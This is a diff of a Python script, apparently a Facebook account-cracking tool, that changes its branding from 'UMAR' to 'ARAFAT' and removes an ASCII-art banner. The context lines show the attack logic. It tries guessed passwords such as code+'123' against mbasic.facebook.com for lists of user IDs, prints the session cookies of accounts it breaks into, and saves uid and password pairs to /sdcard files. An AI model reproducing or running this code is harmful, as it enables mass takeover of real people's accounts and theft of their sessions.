@@ -77,18 +77,7 @@ for xd in range(10000):
 
 logo = ("""  
  \033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
-\033[1;32m║	       
-                              
-   (            )             
-   )\  (     ( /(    (   (    
- (((_) )\ )  )\())  ))\  )(   
- )\___(()/( ((_)\  /((_)(()\  
-((/ __|)(_))| |(_)(_))   ((_) 
- | (__| || || '_ \/ -_) | '_| 
-  \___|\_, ||_.__/\___| |_|   
-       |__/                   
-       
-  \033[1;93m ─━<🌺Assalamu Alaikum🌺>━─\033[1;32m	           ║
+\033[1;32m║	         \033[1;93m ─━<🌺Assalamu Alaikum🌺>━─\033[1;32m	           ║
 \033[1;32m╔══════════════════════════════════════════════════════════╗
 
 \033[1;32m╚═════════════════════════════════════════════════════════════════╝""")
@@ -187,7 +176,7 @@ def gml():
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] \033[38;5;46mCrack process has been completed')
-    print(' [+] \033[38;5;46mIds saved in UMAR-ok.txt,UMAR-cp.txt')
+    print(' [+] \033[38;5;46mIds saved in ARAFAT-ok.txt,ARAFAT-cp.txt')
 def rcrack1(uid,pwx,tl):
     global loop
     global cps
@@ -197,7 +186,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mUMAR-KING]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mBOSS__ARAFAT]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -232,23 +221,24 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[UMAR-OK🐼] {uid} | {ps}")
+                print(f"\033[38;5;46m[ARAFAT-OK🐼] {uid} | {ps}")
                 print(f" Cookie : {coki}")
-                open('/sdcard/UMAR-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/ARAFAT-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                #print(f"\x1b[38;5;196m[UMAR-CP🍾] {uid}|{ps}")
-                #open('/sdcard/UMAR-cp.txt', 'a').write( uid+' | '+ps+' \n')
+                #print(f"\x1b[38;5;196m[ARAFAT-CP🍾] {uid}|{ps}")
+                #open('/sdcard/ARAFAT-cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[38;5;46m[UMAR-KING] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[38;5;46m[𝘽𝙊𝙎𝙎____ARAFAT] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
 Main()
+	    
